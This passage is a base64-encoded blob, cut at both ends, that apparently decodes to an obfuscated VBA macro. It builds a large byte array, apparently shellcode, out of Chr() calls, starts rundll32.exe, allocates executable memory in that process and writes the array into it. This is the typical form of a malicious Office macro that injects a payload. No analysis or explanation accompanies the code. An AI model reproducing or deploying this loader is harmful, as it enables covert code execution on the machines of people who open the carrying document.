g0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDQ5KSYgXw0KQ2hyKDQ0KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTUpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDQ5KSZDaHIoNDQpJkNocig1NykmQ2hyKDU3KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTUpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJiBfDQpDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmIF8NCkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoMzIpJkNocig5NSkmQ2hyKDEwKSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSYgXw0KQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJiBfDQpDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmIF8NCkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoMzIpJkNocig5NSkmQ2hyKDEwKSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSYgXw0KQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTYpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig1NikmQ2hyKDU3KSZDaHIoNDQpJkNocig1MikmQ2hyKDU3KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDQpJkNocig1NikmQ2hyKDU1KSZDaHIoNDQpJkNocig1NikmQ2hyKDU1KSZDaHIoNDQpJkNocig1NikmQ2hyKDU1KSZDaHIoNDQpJiBfDQpDaHIoNTYpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDUyKSZDaHIoNDQpJkNocig1MykmQ2hyKDU2KSZDaHIoNDQpJkNocig1NikmQ2hyKDU0KSZDaHIoNDQpJkNocig0OSkmQ2hyKDUwKSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTYpJkNocig1NykmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MikmQ2hyKDUxKSZDaHIoNDQpJkNocig0NSkmIF8NCkNocig1MCkmQ2hyKDQ5KSZDaHIoNDQpJkNocig0OSkmQ2hyKDUwKSZDaHIoNDkpJkNocig0NCkmQ2hyKDU3KSZDaHIoNDkpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTcpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTMpJkNocig1MykmQ2hyKDQ0KSZDaHIoNTYpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDU0KSZDaHIoNDQpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig0OSkmQ2hyKDQ0KSYgXw0KQ2hyKDU2KSZDaHIoNDkpJkNocig0NCkmQ2hyKDMyKSZDaHIoOTUpJkNocigxMCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1MikmQ2hyKDQ0KSZDaHIoNTYpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDUyKSZDaHIoNDQpJkNocig1NikmQ2hyKDU1KSZDaHIoNDQpJiBfDQpDaHIoNDUpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTcpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTcpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MykmQ2hyKDU2KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUyKSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTApJkNocig0OSkmQ2hyKDQ0KSZDaHIoNTcpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NykmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NykmIF8NCkNocig0NCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDUyKSZDaHIoNDQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNTApJkNocig0NCkmQ2hyKDU3KSZDaHIoNTQpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig1MCkmQ2hyKDUyKSZDaHIoNDQpJkNocig1NikmQ2hyKDUwKSZDaHIoNDQpJkNocig1NikmQ2hyKDUwKSZDaHIoNDQpJkNocig1NikmQ2hyKDUwKSYgXw0KQ2hyKDQ0KSZDaHIoNTYpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNTYpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDUyKSZDaHIoNDQpJkNocigzMikmQ2hyKDk1KSZDaHIoMTApJkNocig0NSkmQ2hyKDUwKSZDaHIoNDkpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTMpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTQpJkNocig0NCkmQ2hyKDUzKSZDaHIoNTcpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJiBfDQpDaHIoNDQpJkNocig0NSkmQ2hyKDUyKSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU3KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUzKSZDaHIoNTYpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTcpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTUpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTUpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTUpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTUpJkNocig0NCkmIF8NCkNocig1NikmQ2hyKDU0KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTIpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTMpJkNocig0NCkmQ2hyKDU0KSZDaHIoNDQpJkNocig1MCkmQ2hyKDUyKSZDaHIoNDQpJkNocig0OSkmQ2hyKDUwKSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDUwKSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ1KSYgXw0KQ2hyKDU0KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTQpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NykmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDUwKSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU0KSZDaHIoNDQpJkNocig1MikmQ2hyKDQ0KSZDaHIoMzIpJiBfDQpDaHIoOTUpJkNocigxMCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU3KSZDaHIoNDQpJkNocig0NSkmQ2hyKDU1KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUwKSZDaHIoNDkpJkNocig0NCkmQ2hyKDU3KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTYpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MykmQ2hyKDU3KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUxKSZDaHIoNDgpJkNocig0NCkmIF8NCkNocig1NykmQ2hyKDUxKSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUyKSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU3KSZDaHIoNDQpJkNocig0NSkmQ2hyKDU0KSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1MikmQ2hyKDQ0KSZDaHIoNTQpJkNocig1NykmQ2hyKDQ0KSZDaHIoNTEpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNTcpJkNocig1MikmQ2hyKDQ0KSYgXw0KQ2hyKDUyKSZDaHIoNTcpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NykmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDU0KSZDaHIoNDQpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNTYpJiBfDQpDaHIoNDgpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1MikmQ2hyKDQ0KSZDaHIoNDUpJkNocig1NSkmQ2hyKDUxKSZDaHIoNDQpJkNocig1NikmQ2hyKDU1KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUxKSZDaHIoNTApJkNocig0NCkmQ2hyKDMyKSZDaHIoOTUpJkNocigxMCkmQ2hyKDQ5KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1NCkmIF8NCkNocig1MykmQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTUpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNTMpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MykmQ2hyKDU1KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTQpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTQpJkNocig1NikmQ2hyKDQ0KSZDaHIoNTIpJkNocig1NykmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ0KSYgXw0KQ2hyKDQ1KSZDaHIoNTApJkNocig0OSkmQ2hyKDQ0KSZDaHIoNTApJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MCkmQ2hyKDQ5KSZDaHIoNDQpJkNocig1NSkmQ2hyKDUxKSZDaHIoNDQpJkNocig0NSkmQ2hyKDUwKSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OCkmQ2hyKDUxKSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDQpJiBfDQpDaHIoNTIpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmQ2hyKDUxKSZDaHIoNDQpJkNocig1NikmQ2hyKDUwKSZDaHIoNDQpJkNocig1NikmQ2hyKDQ5KSZDaHIoNDQpJkNocig1NSkmQ2hyKDUwKSZDaHIoNDQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1MikmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDU0KSZDaHIoNDQpJkNocigzMikmQ2hyKDk1KSZDaHIoMTApJkNocig0NSkmIF8NCkNocig1NSkmQ2hyKDUzKSZDaHIoNDQpJkNocig0NSkmQ2hyKDU3KSZDaHIoNTIpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTQpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTIpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDU0KSZDaHIoNDQpJkNocig1NCkmQ2hyKDUyKSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig0OSkmQ2hyKDU0KSYgXw0KQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNTQpJkNocig1MikmQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDU2KSZDaHIoNTUpJkNocig0NCkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1MikmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NikmQ2hyKDQ0KSZDaHIoNDUpJkNocig1NykmQ2hyKDUwKSZDaHIoNDQpJiBfDQpDaHIoNTYpJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MCkmQ2hyKDU1KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUyKSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OCkmQ2hyKDU3KSZDaHIoNDQpJkNocig1NikmQ2hyKDUxKSZDaHIoNDQpJkNocig1NikmQ2hyKDUxKSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDkpJkNocig1NykmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MCkmIF8NCkNocig1MykmQ2hyKDQ0KSZDaHIoNTYpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OCkmQ2hyKDUyKSZDaHIoNDQpJkNocigzMikmQ2hyKDk1KSZDaHIoMTApJkNocig0OCkmQ2hyKDQ0KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ0KSZDaHIoNDgpJkNocig0NCkmQ2hyKDQ4KSZDaHIoNDQpJkNocig1NikmQ2hyKDUxKSZDaHIoNDQpJkNocig1NikmQ2hyKDU0KSZDaHIoNDQpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNTIpJkNocig0NCkmQ2hyKDQ5KSYgXw0KQ2hyKDU2KSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNDgpJkNocig1NCkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ5KSZDaHIoNTcpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTEpJkNocig0OCkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MikmQ2hyKDUxKSZDaHIoNDQpJkNocig0NSkmQ2hyKDQ5KSZDaHIoNTApJkNocig1MSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1NCkmQ2hyKDUyKSZDaHIoNDQpJiBfDQpDaHIoNDkpJkNocig0OSkmQ2hyKDU0KSZDaHIoNDQpJkNocig0NSkmQ2hyKDUzKSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNDkpJkNocig0OSkmQ2hyKDU1KSZDaHIoNDQpJkNocig1NSkmQ2hyKDQ0KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTQpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDUwKSZDaHIoNTEpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTQpJkNocig1MikmQ2hyKDQ0KSZDaHIoNDkpJkNocig0OSkmIF8NCkNocig1NSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig1MCkmQ2hyKDU1KSZDaHIoNDQpJkNocig1NikmQ2hyKDU2KSZDaHIoNDQpJkNocig0NSkmQ2hyKDU0KSZDaHIoNDkpJkNocig0NCkmQ2hyKDQ1KSZDaHIoNTApJkNocig1MikmQ2hyKDQ0KSZDaHIoNTMpJkNocig1MykmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ0KSZDaHIoNDUpJkNocig0OSkmQ2hyKDQ0KSZDaHIoMzIpJkNocig5NSkmQ2hyKDEwKSYgXw0KQ2hyKDUzKSZDaHIoNTQpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTYpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTQpJkNocig0NCkmQ2hyKDUzKSZDaHIoNDgpJkNocig0NCkmQ2hyKDUzKSZDaHIoNTEpJkNocig0NCkmQ2hyKDUzKSZDaHIoNTEpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTQpJkNocig0NCkmQ2hyKDUzKSZDaHIoNDkpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTQpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTcpJkNocig0NCkmQ2hyKDUyKSZDaHIoNTYpJiBfDQpDaHIoNDQpJkNocig1MykmQ2hyKDU1KSZDaHIoNDQpJkNocig0OCkmQ2hyKDQxKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDczKSZDaHIoMTAyKSZDaHIoMzIpJkNocig3NikmQ2hyKDEwMSkmQ2hyKDExMCkmQ2hyKDQwKSZDaHIoNjkpJkNocigxMTApJkNocigxMTgpJkNocigxMDUpJkNocigxMTQpJkNocigxMTEpJkNocigxMTApJkNocig0MCkmQ2hyKDM0KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocigxMDMpJkNocigxMTQpJiBfDQpDaHIoOTcpJkNocigxMDkpJkNocig4NykmQ2hyKDU0KSZDaHIoNTIpJkNocig1MSkmQ2hyKDUwKSZDaHIoMzQpJkNocig0MSkmQ2hyKDQxKSZDaHIoMzIpJkNocig2MikmQ2hyKDMyKSZDaHIoNDgpJkNocigzMikmQ2hyKDg0KSZDaHIoMTA0KSZDaHIoMTAxKSZDaHIoMTEwKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTE1KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJiBfDQpDaHIoOTkpJkNocigzMikmQ2hyKDYxKSZDaHIoMzIpJkNocig2OSkmQ2hyKDExMCkmQ2hyKDExOCkmQ2hyKDEwNSkmQ2hyKDExNCkmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDQwKSZDaHIoMzQpJkNocigxMTkpJkNocigxMDUpJkNocigxMTApJkNocigxMDApJkNocigxMDUpJkNocigxMTQpJkNocigzNCkmQ2hyKDQxKSZDaHIoMzIpJkNocigzOCkmQ2hyKDMyKSZDaHIoMzQpJkNocig5MikmQ2hyKDkyKSZDaHIoODMpJkNocigxMjEpJkNocigxMTUpJkNocig4NykmQ2hyKDc5KSYgXw0KQ2hyKDg3KSZDaHIoNTQpJkNocig1MikmQ2hyKDkyKSZDaHIoOTIpJkNocigxMTQpJkNocigxMTcpJkNocigxMTApJkNocigxMDApJkNocigxMDgpJkNocigxMDgpJkNocig1MSkmQ2hyKDUwKSZDaHIoNDYpJkNocigxMDEpJkNocigxMjApJkNocigxMDEpJkNocigzNCkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocig2OSkmQ2hyKDEwOCkmQ2hyKDExNSkmQ2hyKDEwMSkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJiBfDQpDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigxMTUpJkNocig4MCkmQ2hyKDExNCkmQ2hyKDExMSkmQ2hyKDk5KSZDaHIoMzIpJkNocig2MSkmQ2hyKDMyKSZDaHIoNjkpJkNocigxMTApJkNocigxMTgpJkNocigxMDUpJkNocigxMTQpJkNocigxMTEpJkNocigxMTApJkNocig0MCkmQ2hyKDM0KSZDaHIoMTE5KSZDaHIoMTA1KSZDaHIoMTEwKSZDaHIoMTAwKSZDaHIoMTA1KSZDaHIoMTE0KSZDaHIoMzQpJkNocig0MSkmQ2hyKDMyKSZDaHIoMzgpJkNocigzMikmIF8NCkNocigzNCkmQ2hyKDkyKSZDaHIoOTIpJkNocig4MykmQ2hyKDEyMSkmQ2hyKDExNSkmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDEwOSkmQ2hyKDUxKSZDaHIoNTApJkNocig5MikmQ2hyKDkyKSZDaHIoMTE0KSZDaHIoMTE3KSZDaHIoMTEwKSZDaHIoMTAwKSZDaHIoMTA4KSZDaHIoMTA4KSZDaHIoNTEpJkNocig1MCkmQ2hyKDQ2KSZDaHIoMTAxKSZDaHIoMTIwKSZDaHIoMTAxKSZDaHIoMzQpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoNjkpJiBfDQpDaHIoMTEwKSZDaHIoMTAwKSZDaHIoMzIpJkNocig3MykmQ2hyKDEwMikmQ2hyKDEwKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjEpJkNocigzMikmQ2hyKDgyKSZDaHIoMTE3KSZDaHIoMTEwKSZDaHIoODMpJkNocigxMTYpJkNocigxMTcpJkNocigxMDIpJkNocigxMDIpJkNocig0MCkmQ2hyKDExNSkmQ2hyKDc4KSZDaHIoMTE3KSZDaHIoMTA4KSZDaHIoMTA4KSZDaHIoNDQpJiBfDQpDaHIoMzIpJkNocigxMTUpJkNocig4MCkmQ2hyKDExNCkmQ2hyKDExMSkmQ2hyKDk5KSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoNDgpJkNocigzOCkmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDQ4KSZDaHIoMzgpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSYgXw0KQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoNDkpJkNocigzOCkmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDUyKSZDaHIoMzgpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocig0OCkmQ2hyKDM4KSZDaHIoNDQpJkNocigzMikmQ2hyKDExNSkmQ2hyKDc4KSZDaHIoMTE3KSZDaHIoMTA4KSZDaHIoMTA4KSZDaHIoNDQpJiBfDQpDaHIoMzIpJkNocigxMTUpJkNocig3MykmQ2hyKDExMCkmQ2hyKDEwMikmQ2hyKDExMSkmQ2hyKDQ0KSZDaHIoMzIpJkNocigxMTIpJkNocig3MykmQ2hyKDExMCkmQ2hyKDEwMikmQ2hyKDExMSkmQ2hyKDQxKSZDaHIoMTApJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMTE0KSZDaHIoMTE5KSZDaHIoMTIwKSZDaHIoMTEyKSZDaHIoOTcpJkNocigxMDMpJkNocigxMDEpJkNocigzMikmQ2hyKDYxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDEwOCkmIF8NCkNocigxMDgpJkNocigxMTEpJkNocig5OSkmQ2hyKDgzKSZDaHIoMTE2KSZDaHIoMTE3KSZDaHIoMTAyKSZDaHIoMTAyKSZDaHIoNDApJkNocigxMTIpJkNocig3MykmQ2hyKDExMCkmQ2hyKDEwMikmQ2hyKDExMSkmQ2hyKDQ2KSZDaHIoMTA0KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDQ0KSZDaHIoMzIpJkNocig0OCkmQ2hyKDQ0KSZDaHIoMzIpJkNocig4NSkmQ2hyKDY2KSZDaHIoMTExKSZDaHIoMTE3KSYgXw0KQ2hyKDExMCkmQ2hyKDEwMCkmQ2hyKDQwKSZDaHIoMTA5KSZDaHIoMTIxKSZDaHIoNjUpJkNocigxMTQpJkNocigxMTQpJkNocig5NykmQ2hyKDEyMSkmQ2hyKDQxKSZDaHIoNDQpJkNocigzMikmQ2hyKDM4KSZDaHIoNzIpJkNocig0OSkmQ2hyKDQ4KSZDaHIoNDgpJkNocig0OCkmQ2hyKDQ0KSZDaHIoMzIpJkNocigzOCkmQ2hyKDcyKSZDaHIoNTIpJkNocig0OCkmQ2hyKDQxKSZDaHIoMTApJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDcwKSYgXw0KQ2hyKDExMSkmQ2hyKDExNCkmQ2hyKDMyKSZDaHIoMTExKSZDaHIoMTAyKSZDaHIoMTAyKSZDaHIoMTE1KSZDaHIoMTAxKSZDaHIoMTE2KSZDaHIoMzIpJkNocig2MSkmQ2hyKDMyKSZDaHIoNzYpJkNocig2NikmQ2hyKDExMSkmQ2hyKDExNykmQ2hyKDExMCkmQ2hyKDEwMCkmQ2hyKDQwKSZDaHIoMTA5KSZDaHIoMTIxKSZDaHIoNjUpJkNocigxMTQpJkNocigxMTQpJkNocig5NykmQ2hyKDEyMSkmQ2hyKDQxKSZDa